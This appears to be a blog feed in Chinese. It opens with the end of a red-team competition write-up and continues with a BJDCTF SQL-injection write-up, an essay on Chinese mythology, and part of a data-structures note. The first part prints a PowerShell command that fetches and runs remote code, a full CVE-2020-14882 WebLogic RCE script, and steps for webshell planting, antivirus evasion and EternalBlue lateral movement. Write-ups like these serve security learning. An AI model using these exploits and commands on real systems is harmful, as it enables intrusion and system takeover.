植入webshell</h5><p>和靶机一一样在前台找到模板管理，编辑<code>index_index.php</code>写入一句话木马即可。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20240225223257.png" alt="" /></p><h4 id="软件免杀"><a class="markdownIt-Anchor" href="#软件免杀"></a> 软件免杀</h4><p>蚁剑上线后输入<code>whoami</code>查看用户权限。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240225225125189.png" alt="image-20240225225125189" /></p><p>可以看到我们的权限是system，出道即巅峰。但是既然不需要提权，那么一定还有高手。</p><p>尝试命令执行powershell上线。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.110.64:80/index&#x27;))&quot;</span></span><br></pre></td></tr></table></figure><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20240225225335.png" style="zoom:50%;" /><p>上线失败，猜测有杀毒软件拦截。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240225225453267.png" alt="image-20240225225453267" style="zoom: 67%;" /><p>还真有，万恶的火绒：）</p><p>尝试执行删除竟然还失败了，nnd我的系统权限是假的吗？？？</p><p>无奈，只好对shell进行免杀绕过杀软（字面意义），上传免杀程序。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20240225225700.png" alt="" /></p><p>执行exe文件后成功上线。</p><h4 id="小小结-2"><a class="markdownIt-Anchor" href="#小小结-2"></a> 小小结</h4><p>这道题的思路和靶机一有点区别，通过弱口令进入后台植入webshell。如果是数据库注入则利用慢日志写入一句话，如果是YXcms后台则和靶机一相同修改模板植入webshell。蚁剑连接webshell后，虽然是最高权限不需要进行提权，却需要绕过火绒进行免杀操作，这里需要制作免杀程序，笔者作为web手确实是第一次接触。</p><p>和靶机一一样，笔者在进行到蚁剑连接webshell步骤时就遇到了问题。在蚁剑开启虚拟终端后，命令行直接报废显示指令<code>cmd</code>不存在。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240225230312978.png" alt="image-20240225230312978" /></p><p>这一错误直接导致笔者在靶机二上栽了，所幸队友可以正常连接蚁剑，所以他们制作出了免杀马并进行了后续一系列操作。虽然笔者也根据<code>ashelp</code>命令的提示，执行<code>ascmd C:\Windows\System32\cmd.exe</code>恢复了一部分cmd的功能，但是权限仍然低的离谱，缺乏<code>whoami</code>，<code>ipconfig</code>等一系列指令，基本上没啥用。</p><p>赛后笔者复盘，根据老师的提醒应该是进行慢日志注入时没有执行<code>set global general_log = off;</code>关闭全局日志，导致蚁剑连接期间日志仍然在不断写入，产生大量脏数据。但是队友和我连的是同一个马，为什么他的蚁剑就可以正常执行呢？不知道，希望大佬浇浇（doge）。</p><h3 id="靶机三"><a class="markdownIt-Anchor" href="#靶机三"></a> 靶机三</h3><p>连接靶机，注意端口，否则打不开网站。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/wk8ve2c9da.jpeg" alt="wk8ve2c9da" style="zoom:67%;" /><p>找不到图了所以网上找了张代替下。</p><p>可以看到是WebLogic Server的后台登录界面。</p><h4 id="利用poc直接rce"><a class="markdownIt-Anchor" href="#利用poc直接rce"></a> 利用POC直接RCE</h4><p>直接上网查找相应的漏洞，说实话现成的poc还蛮多的，又是绕过认证登录后台，又是任意命令执行的。这里贴出我在网上找到的一个现成的poc脚本，可以直连url进行RCE。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># author: zhzyker</span></span><br><span class="line"><span class="comment"># from: https://github.com/zhzyker/vulmap</span></span><br><span class="line"><span class="comment"># from: https://github.com/zhzyker/exphub</span></span><br><span class="line"><span class="keyword">import</span> http.client</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">http.client.HTTPConnection._http_vsn_str = <span class="string">&#x27;HTTP/1.0&#x27;</span></span><br><span class="line"></span><br><span class="line">payload_cve_2020_14882_v12 = (<span class="string">&#x27;_nfpb=true&amp;_pageLabel=&amp;handle=&#x27;</span></span><br><span class="line">            <span class="string">&#x27;com.tangosol.coherence.mvel2.sh.ShellSession(&quot;weblogic.work.ExecuteThread executeThread = &#x27;</span></span><br><span class="line">            <span class="string">&#x27;(weblogic.work.ExecuteThread) Thread.currentThread(); weblogic.work.WorkAdapter adapter = &#x27;</span></span><br><span class="line">            <span class="string">&#x27;executeThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField&#x27;</span></span><br><span class="line">            <span class="string">&#x27;(&quot;connectionHandler&quot;); field.setAccessible(true); Object obj = field.get(adapter); weblogic.servlet&#x27;</span></span><br><span class="line">            <span class="string">&#x27;.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) &#x27;</span></span><br><span class="line">            <span class="string">&#x27;obj.getClass().getMethod(&quot;getServletRequest&quot;).invoke(obj); String cmd = req.getHeader(&quot;cmd&quot;); &#x27;</span></span><br><span class="line">            <span class="string">&#x27;String[] cmds = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? new String[]&#x27;</span></span><br><span class="line">            <span class="string">&#x27;&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125; : new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;; if (cmd != null) &#123; String result &#x27;</span></span><br><span class="line">            <span class="string">&#x27;= new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter&#x27;</span></span><br><span class="line">            <span class="string">&#x27;(&quot;\\\\A&quot;).next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.&#x27;</span></span><br><span class="line">            <span class="string">&#x27;ServletResponseImpl) req.getClass().getMethod(&quot;getResponse&quot;).invoke(req);&#x27;</span></span><br><span class="line">            <span class="string">&#x27;res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));&#x27;</span></span><br><span class="line">            <span class="string">&#x27;res.getServletOutputStream().flush(); res.getWriter().write(&quot;&quot;); &#125;executeThread.interrupt(); &quot;);&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cve_2020_14882</span>(<span class="params">url, cmd</span>):</span><br><span class="line">    payload = payload_cve_2020_14882_v12</span><br><span class="line">    path = <span class="string">&quot;/console/css/%252e%252e%252fconsole.portal&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,&#x27;</span></span><br><span class="line">                  <span class="string">&#x27;application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;cmd&#x27;</span>: cmd</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        request = requests.post(url + path, data=payload, headers=headers, timeout=<span class="number">10</span>, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="built_in">print</span>(request.text)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> error:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Vuln Check Failed... ...&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] More Weblogic vulnerabilities in https://github.com/zhzyker/vulmap&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Weblogic cve-2020-14882&#x27;</span>,</span><br><span class="line">                                     usage=<span class="string">&#x27;use &quot;python %(prog)s --help&quot; for more information&#x27;</span>,</span><br><span class="line">                                     formatter_class=argparse.RawTextHelpFormatter)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>,</span><br><span class="line">                        dest=<span class="string">&quot;url&quot;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&quot;target url (http://127.0.0.1:7001)&quot;</span></span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;--cmd&quot;</span>,</span><br><span class="line">                        dest=<span class="string">&quot;cmd&quot;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&quot;command&quot;</span></span><br><span class="line">                        )</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.url <span class="keyword">or</span> <span class="keyword">not</span> args.cmd:</span><br><span class="line">        sys.exit(<span class="string">&#x27;[*] Please assign url and cmd! \n[*] Examples python cve-2020-14882_rce.py -u http://127.0.0.1:7001 -c whoami&#x27;</span>)</span><br><span class="line">    cve_2020_14882(args.url, args.cmd)</span><br></pre></td></tr></table></figure><p>执行格式如下。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python cve-2020-14882_rce.py -u http://127.0.0.1:7001 -c <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p>虽然如此，因为权限太低，即便可以实现RCE，对于一些敏感文件目录连读权限都没有，更别说写入木马了（起码我不知道怎么用RCE写入木马）</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/5a25ef56a3ae46aad769882b0ab6034.png" alt="5a25ef56a3ae46aad769882b0ab6034" style="zoom:67%;" /><p>使用工具LiqunKit进行扫描，可以看到LiqunKit成功写入了webshell，但是它却没给webshell的密码！这下子出现了滑稽的一幕，我们植入了webshell，却不知道webshell写的啥，无法用蚁剑连接1进行进一步提权操作。（太菜了555大佬打轻点）</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/e4ffc2eba9406aa3938775b2e0e8e2a.png" alt="e4ffc2eba9406aa3938775b2e0e8e2a" style="zoom:67%;" /><p>直到比赛下午临时休息，不知道为什么那边下线了靶场，重新修改后上线删除了靶机三，我们也就没有机会继续深入了，对WebLogic的挖掘也止步于此，问题不了了之。</p><h4 id="小小结-3"><a class="markdownIt-Anchor" href="#小小结-3"></a> 小小结</h4><p>靶机三是三台主机中唯一一台只拿下了部分权限的机器，因为后续下线的原因导致思路中断，也没有机会进一步验证操作尝试植入webshell以及提权操作。</p><p>有关WebLogic Server的漏洞网上有很多资料，虽然可以免登录绕过直接进入后台，但是权限低的离谱什么都干不了；虽然可以根据poc进行RCE，但是权限不够不知道该如何写入webshell（或者说不知道怎么把webshell写入到我们能够访问的路径下）；虽然可以利用LiqunKit工具进行getshell，但是因为不熟悉工具不知道该如何利用webshell。网络上的普遍解法是利用弱口令登录后台，修改配置后结合RCE写入webshell，但是后台的弱口令我们没爆出来qwq。所以，这题也就只能留待以后解决了，希望大佬浇浇。</p><h2 id="横向攻击"><a class="markdownIt-Anchor" href="#横向攻击"></a> 横向攻击</h2><p>以上介绍的都是如何夺取第一层的靶机权限，实际上在夺取任意一台靶机权限后，就可以深入内网进行横向攻击了。但是由于我们对此方面并不熟悉，所以大部分时间都花在打第一层靶机上了（提权、免杀）。所以这里只简单的介绍一下我们横向攻击的进展，实质上并没有完成全部的流程，不过如果时间足够的话，应该是可以夺取第二层靶机的权限的（实际上队友后来复现时也确实成功了）。</p><h3 id="扫描端口代理访问"><a class="markdownIt-Anchor" href="#扫描端口代理访问"></a> 扫描端口/代理访问</h3><p>大概的思路是，将nmap或者fscan传入已经夺取权限的内网靶机中，然后开启端口扫描查看是否有可以端口通信，如果有就有可能是内网第二层靶机。之后就可以通过第一层靶机的IP代理访问第二层靶机，进行分析。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/6012149ef1407f3a30d6e441a11c3e2.png" alt="6012149ef1407f3a30d6e441a11c3e2" style="zoom:50%;" /><p>利用fscan扫描端口，发现455端口开放且为win7系统，确认是永恒之蓝漏洞。</p><h3 id="攻击漏洞"><a class="markdownIt-Anchor" href="#攻击漏洞"></a> 攻击漏洞</h3><p>之后再启动metaspoilt，利用攻击模块对漏洞进行攻击。</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/e9ba90a4123e3a489900af4d0e0d3fe.png" alt="e9ba90a4123e3a489900af4d0e0d3fe" style="zoom:50%;" /><p>最后右键提权提取明文密码，然后windows用代理和账号密码远程控制桌面拿下第二层。</p><h3 id="小小结-4"><a class="markdownIt-Anchor" href="#小小结-4"></a> 小小结</h3><p>在拿下内网中任意一台机器的权限后，就可以进行横向攻击打深层的内网机器了。基本的思路是先利用fscan等工具扫描已取得权限的内网机器通信端口寻找深层内网机器，再通过第一层内网机器的代理访问其他内网机器，然后特征分析得到漏洞，再用工具打下第二层机器，更深层机器以此类推。</p><p>关于横向攻击的部分笔者写的较为简略，主要是因为队友复现时笔者不在旁边，没有记录下完整的过程，所以并不能保证思路正确。注入如何利用metaspoilt攻击永恒之蓝漏洞，我就无法说明了，只能记载下简单的思路和结果。</p><h2 id="小结"><a class="markdownIt-Anchor" href="#小结"></a> 小结</h2><p>那么到这里，比赛的复盘终于到了尾声。可以看到，直到现在其实笔者还是存在不少问题。比如莫名其妙的报错、WebLogic的漏洞利用、横向攻击的知识缺失、工具的使用不熟练等都还未得到解决。最典型的就是CobaltStrike，对于这种最基本的代理工具与渗透利器笔者掌握的还是不够。在笔者还在手动getshell的时候，队友已经在用C2自动投递Webshell了。</p><p>通过这次攻防演练，笔者充分认识到了自己在知识方面存在的漏洞与欠缺，在渗透实战方面尤为严重，而这些是在平时的CTF中根本接触不到的。希望通过这次比赛，以后能够加强这方面顶点训练。</p><p>那么以上，作为一个初学者小白的思考，这些思路可能过于幼稚与低级，甚至还有诸多错误遗漏，还望大佬指出纰漏之处，以及轻喷qwq。</p><h2 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h2><ul><li><a href="https://www.cnblogs.com/xuyangda/p/14510562.html">MYSQL写入Webshell - Display_x - 博客园 (cnblogs.com)</a></li><li><a href="https://cloud.tencent.com/developer/article/1480823">Weblogic渗透测试指南</a></li><li><a href="https://www.anquanke.com/post/id/233114">对蚁剑的相关改造及分析-安全客 - 安全资讯平台 (anquanke.com)</a></li><li><a href="https://blog.csdn.net/h1825819493/article/details/131401878">fscan安装以及使用-CSDN博客</a></li><li><a href="https://blog.csdn.net/weixin_44604541/article/details/119344412">内网渗透系列：横向渗透方法小结_av9090-CSDN博客</a></li><li><a href="https://blog.csdn.net/weixin_43079958/article/details/105896283">权限提升之——windows提权_windows 提权 无法执行cmd命令-CSDN博客</a></li><li><a href="https://blog.csdn.net/qq_45894840/article/details/125088995">Linux手动提权，万字基础详细教程以及经验分享_linux/local/37292.c-CSDN博客</a></li><li><a href="https://blog.csdn.net/qq_42808240/article/details/127431571">Win7经典漏洞永恒之蓝复现_win7漏洞复现实例-CSDN博客</a></li><li><a href="https://note.youdao.com/ynoteshare/index.html?id=ecca5535b569cebeaebaf153e26b05a8&amp;type=note&amp;_time=1708864970352">有道云笔记 (youdao.com)</a></li><li><a href="https://github.com/AntSwordProject/antSword/issues/337">客户端连接报错：“code”:“DEPTH_ZERO_SELF_SIGNED_CERT” · Issue #337 · AntSwordProject/antSword · GitHub</a></li><li><a href="https://www.cnblogs.com/sfsec/p/15163907.html">最详细Linux提权总结（建议收藏） - 随风kali - 博客园 (cnblogs.com)</a></li><li><a href="https://blog.csdn.net/q20010619/article/details/121407815">Linux提权第一篇-Linux内核漏洞提权(以CVE-2015-1328为例)_linux内核提权靶场环境-CSDN博客</a></li><li><a href="https://blog.csdn.net/qq_57663276/article/details/126637424">提权，远程连接控制目标。_连接蚁剑后要想虚拟终端命令执行如何权限提升-CSDN博客</a></li></ul><h2 id="尾声"><a class="markdownIt-Anchor" href="#尾声"></a> 尾声</h2><p>在进行横向攻击时，队友错误的把双网卡的攻击机当成了内网的第二层机器，把自己打了下来（）。</p><p>还有高手传马时绕不过杀软，在本地测试时却绕过了自己电脑的火绒（）。</p><hr /><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/93386896_p0.png" alt="93386896_p0" /></p>]]></content>
      
      
      <categories>
          
          <category> CTF Write Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 日志注入 </tag>
            
            <tag> Linux提权 </tag>
            
            <tag> 免杀绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>easy_md5のWP——SQL下的弱类型比较</title>
      <link href="/posts/4ecd645b2fe8/"/>
      <url>/posts/4ecd645b2fe8/</url>
      
        <content type="html"><![CDATA[<p>于NSSCTF上刷到此题，觉得颇有几处新意，故整理一份WP，题目传送门如下：<a href="https://www.nssctf.cn/problem/713">(BJDCTF 2020)easy_md5 | NSSCTF</a>。</p><h2 id="题解"><a class="markdownIt-Anchor" href="#题解"></a> 题解</h2><p>话不多说开启容器。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240220222234112.png" alt="image-20240220222234112" /></p><p>可以看到的是，进入题目后只有一份提交文本框，没什么其他信息。随便提交一个数字，网页的URL引起了我的注意。</p><figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28685/leveldo4.php?password=1</span><br></pre></td></tr></table></figure><p>嗯，看起来像是个SQL注入。但是用sqlmap爆破无果，用BurpSuite抓包也没有得到什么有用的信息。但其实还是有信息的，如果你仔细观察响应报文，会发现文件头中出现了hint。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240220222555176.png" alt="image-20240220222555176" /></p><figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="code"><pre><span class="line">hint: select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure><p>果然是一条经典的MySQL语句</p><p>接下来的问题就是怎么让这条语句成立然后给出我们想要的信息了。</p><p>经过查阅资料后得知MySQL中的“万能密码”<code>ffifdyop</code>。这串字符被md5函数编码后变成<code>276f722736c95d99e921722cf9ed621c</code>，随后再经过MySQL编码就变成了<code>'or'6xxx</code>。其中xxx的部分是无关字符串，但是由于该字符串以6开头而被MySQL认为是整形，再和前方的部分拼接在一起，整条语句就变成了如下形式。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password &#x27;&#x27;or&#x27;6xxx&#x27;</span><br></pre></td></tr></table></figure><p>此时该SQL语句恒成立，成功执行后跳转到levels91.php，查看源代码。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240220223615134.png" alt="" /></p><p>接下来就是简单的PHP弱类型比较了，这里可以上传md5碰撞值，也可以上传数组变量a、b，还可以直接跳转到levell14.php。</p><p>跳转到levell14.php后出现以下代码。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240220223810982.png" alt="image-20240220223810982" /></p><p>同样的思路，由于是强类型比较所以上传碰撞值的方法失效，此时上传数组变量param1和param2即可。</p><h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2><p>这题难度较为简单，但是关于万能密码<strong>ffifdyop</strong>的知识点也十分重要，有单独写一篇WP的必要，权当积累。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/AceAttorneyArtGallery.png" alt="AceAttorneyArtGallery" /></p>]]></content>
      
      
      <categories>
          
          <category> CTF Write Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为什么说中国神话是早衰的呢？</title>
      <link href="/posts/d96472dea54f/"/>
      <url>/posts/d96472dea54f/</url>
      
        <content type="html"><![CDATA[<p>事情是这样的，我在一个帖子底下和吧友讨论黑猴后面又说到了中国神话体系的问题，结果到后面险些引发骂战，我觉得我当时表述的意思可能不清楚，让一些吧友误以为我在刻意贬低中华神话乃至华夏文化，并对我的老师个人品和学术产生了质疑。故立此贴为证，我决定简单写一下分享一些我对于中华神话的看法，不足之处还望各位多多批评指正。</p><p>首先，什么是神话呢？我们引用马克思《&lt;政治经济学批判&gt;导言》中的话来概述一下，“任何神话都是用想象和借助想象以征服自然力，支配自然力，把自然力加以形象化”。神话或者祭祀，其实都是人类自身生活的反应。在生存的过程中，人类不断受到挑战。在敬畏大自然的同时，人们也有支配自然的欲望。于是先民们也尝试着利用自己的知识去解读各种自然现象，尝试着去克服困难，神话也就应运而生。</p><p>神话根据内容又可以分为两类，按照内容分类或者按照起源与发展的序列分类。</p><p>其中按照内容分类又可分为两类，一种是创世神话，一种是英雄神话。</p><p>我们中国是不缺乏创世神话的，女娲造人，盘古开天辟地，伏羲创世作八卦，这些都是属于我们的创世神话。</p><p>但是遗憾的是，单论汉文化，我们是没有英雄神话的，这可以说是一个小小的瑕疵。但是跳出汉文化的神话圈，藏族有《格萨尔传》，蒙古族有《江格尔》，新疆有《玛纳斯》，所以以中国的角度去看，我们也可以说我们有自己的英雄神话，只不过并不属于汉神话圈内。</p><p>第二种就是按照起源与发展的序列去分类，这又可以分为原始神话、古典神话和文明神话。一般来说，中国的神话大多都属于原始神话。</p><p>那么终于来到中国神话了，中国神话相比较于西方的神话体系，都有些什么特点呢？我认为有以下几点：</p><p>一、中国神话的内容极其丰富，但是形式却较为短小，故事性不够强。这个主要是受限于当时的语言载体，我们都知道古代所用的是文言文，篇幅一般都不会很长。《孔雀东南飞》就已经是是我国古代文学史上最早最长的一首长篇叙事诗了。我们来看比较经典的夸父逐日：</p><p>夸父与日逐走，入日；渴，欲得，饮于河、渭；河、渭不足，北饮大泽。未至，道渴而死。弃其杖，化为邓林。</p><p>一共就不到四十个字，对比希腊神话任何一篇都是不够塞牙缝的，拉出一个海无力都有一堆传记。所以说，相对于西神，中神的故事性并不强，这是我认为中神的一个特点之一。</p><p>二、神话的生态很零乱，具体表现为一个神迹有多种矛盾的说法。比如我前面提到的，我们的创世论有很多种说法，有盘古的，有女娲的，有伏羲的，冷门点还有烛阴的。在盘古神话中，太阳是他的眼睛；在后羿射日里，太阳是天帝的儿子而且有9个，最后还被后羿射掉了8个。哪怕是嫦娥奔月也有几个不同的版本，有说嫦娥是因为私心把后羿的药吞了独自成神的，有说嫦娥是被逄蒙所逼迫不得已吞药奔月的。所以说，中神并不系统，它并没有形成一个完整统一的说辞，这也是它的一个特点之一。</p><p>三、中神的神与神之间的跨区域联系很少，并没有形成一个一神独尊的中心关系网。道教文化认三清，民间认玉帝，地方上福建认妈祖最大，西南和藏疆更不用说了。这点西神做的很到位，比如希腊神话中就有主神宙斯，北欧神话有主神奥丁。希腊神话中的神灵是谱系化的，中国的神灵缺乏这种系统性，这是我认为的中神的第三个特点。</p><p>四、中神的形象较为原始，道德较为严谨。具体可见山海经等大多数民间传说中对神灵的描述，都是呈现半人半兽，或者人兽同体的特点。比如女娲就是经典的人首蛇身。在思想情感上，中神呈现出较为超凡脱俗的特点，世俗色彩淡薄。而西神则呈现出相当的世俗特点。希腊神话中，神也会偷情，会嫉妒，会恶意中伤。中国的神是神圣的，道德化的；希腊的神是世俗的，人性化的；希腊神话中的神个性更加鲜明，中国神话中的神性格模糊。这是我认为的中国神话的第四个特点。</p><p>那么，经过以上阐述，我想浅浅的小结一下。与世界其他的国家相比较，中国现存的（尤其是汉语言的）较为零碎，这是一个不争的事实。但是，这并不是因为中华民族缺乏想象力。从中国现存的神话来看，其想象力之傀异，并不逊色于任何一个国家的文化作品。我们可以预见，远古时期的中华民族，一定拥有着大量的神话，可惜后来没有得到很好的保存，逐渐散落在各个文人的作品中。</p><p>其中，神话的历史化是中国古代神话衰弱的一个主要原因。最明显的例子就是“三皇五帝”从神系变成帝系。而儒家推行的重实际黜玄想的现实主义精神，也对神话的生存造成了极大的威胁。由于正统文化的疏离，神话距离主流文化渐行渐远。在神话的发展史中，有的被载入史册成为了堂而皇之的历史，有的逐渐转化为了“传说”（传说不同于神话，它的主角更多是人而不是神，比如梁祝传说、白蛇传说、牛郎织女传说和孟姜女传说），有的则在道教徒的改编中变成了神仙之说。而真正活在民间的神话，也因为口口相传逐渐失去了其原本的模样。</p><p>简要的概述一下，中国神话曾经拥有过灿烂的时光，从现存的零星故事中我们也能瞥见一眼她当初的辉煌。但我们不得不承认的一点是，中国神话后来不可避免的走向了衰弱。但这一定是坏事吗？答案是否。我们的神话系统为什么早衰，是因为我们比其他国家更早的迈向了成熟。中华先民对现实的苦难有着极为深刻的体验。女娲补天和大禹治水都是关于洪灾的忧虑，后羿射日是关于旱灾的警醒。在各种灾害的摧残下，我们的民族还是坚强的生长了起来，并开始用现实的方法去应对灾难。于是我们更快的从记载神话步入到了记述历史，西方开始记录正儿八经的历史时中国都已经西汉了。在古代中国，世俗的王权是永远凌驾于神权之上的，换句话说就是我们不需要通过神来统治天下（虽然还是需要多多少少神化自己一点说自己是天子龙体，但五千年了这么多皇帝了懂的都懂），而西方却需要借助神权来巩固自己的统治（事实上直到欧洲中世纪神权仍然在和王权相互掣肘，教会顶峰时期甚至可以直接罢免王权），因此希腊神话得到了系统而充分的整理和加工，以此来巩固神权的合法性。而中神则保留了较原始的面貌，最后被逐渐历史化。</p><p>以上，就是我对中神的看法，以及为什么西神要比中神体系更加系统化。所以我认为如果游戏需要对神话故事进行加工和改编，西神要比中神来的更快，毕竟人家已经有成熟的模板。当然，这也不是意味着中神就难以进行改编，中神的碎片化其实是一个丰富的灵感池，给人留下来巨大的想象空间，又有利于人们对它进行更为大胆的改编和创作（黑猴出列！）。而且虽然我们的神话保存的不是很尽人意，但这其实意味着我们有与世绝伦的历史文化以及民间传说，所以比起直通上古的神话，我们更多的艺术加工都是基于我们的历史来进行二创。比如《三国演义》，现在基于汉唐，两宋为背景的IP作品也层出不穷。</p><p>最后我想强调的是，虽然中神在系统性上没有西神那么成熟，但这并不意味着我们的神话不行，甚至低西方一头。中神之瑰丽丰富同其他国家一样精彩，其彰显的中华民族精神更是在全世界独树一帜的。我热爱着这片土地，热爱着这片土地上诞生的文化。也预祝黑神话悟空能够在中神这块瑰宝上进行精彩的创作，取得出色的成绩。谢谢大家。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/5632cfa4c9496fba9fa739db609203a.jpg" alt="5632cfa4c9496fba9fa739db609203a" /></p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
            <tag> 中国神话 </tag>
            
            <tag> 西方神话 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构什锦（七）——查找</title>
      <link href="/posts/2105297cdd14/"/>
      <url>/posts/2105297cdd14/</url>
      
        <content type="html"><![CDATA[<p>连一刻也没有为图的听不懂哀悼，立刻赶来战场的是——查找！</p><hr /><p>从本章开始基本的数据结构已经差不多学习完毕，开始涉及一些基础的算法知识。（其实先前已经接触了一些经典的算法了，说的就是你呢迪杰斯特拉）。查找是最为基础的算法之一，所涉及的知识点也较为简单。</p><h2 id="序言"><a class="markdownIt-Anchor" href="#序言"></a> 序言</h2><p>那么我们这篇文章主要会学习以下几个知识点：</p><ul><li><p>顺序查找</p><p>没啥好说的，就是遍历元素直到找到为止。</p></li><li><p>折半查找</p><p>应该是借鉴了分治法的思想，能够以较好的时间复杂度查找元素，和快排类似。但是只限用于<strong>顺序储存结构</strong>的<strong>有序表</strong>。</p></li><li><p>分块查找</p><p>也没啥好说的，是一种对顺序查找的改进算法。除了查询表本身外还需要建立一个索引表，将要查找的内容分块提前筛掉一部分数据缩小搜索范围，提高效率。</p></li></ul><p>以上三点都属于<strong>静态查找</strong>，接下来是<strong>动态查找</strong>。</p><ul><li><p>二叉排序树/BST</p><p>重点之一，相对不是很难理解。</p></li><li><p>平衡二叉树/AVL</p><p>重点之二，有点烧脑，本篇的重心。</p></li><li><p>B+、B-等变体树</p><p>仅作为拓展内容了解即可。</p></li></ul><p>至于什么是静态查找什么是动态查找呢？静态就是说只进行查找操作，而不涉及插入或删除数据的操作；动态则不仅查找过程，还会设计插入或删除数据元素的操作。</p><p>那么闲话少说，真是开始进入正文部分。</p><h2 id="静态查找"><a class="markdownIt-Anchor" href="#静态查找"></a> 静态查找</h2><p>这里我们来简单地过一遍静态查找。</p><h3 id="顺序查找"><a class="markdownIt-Anchor" href="#顺序查找"></a> 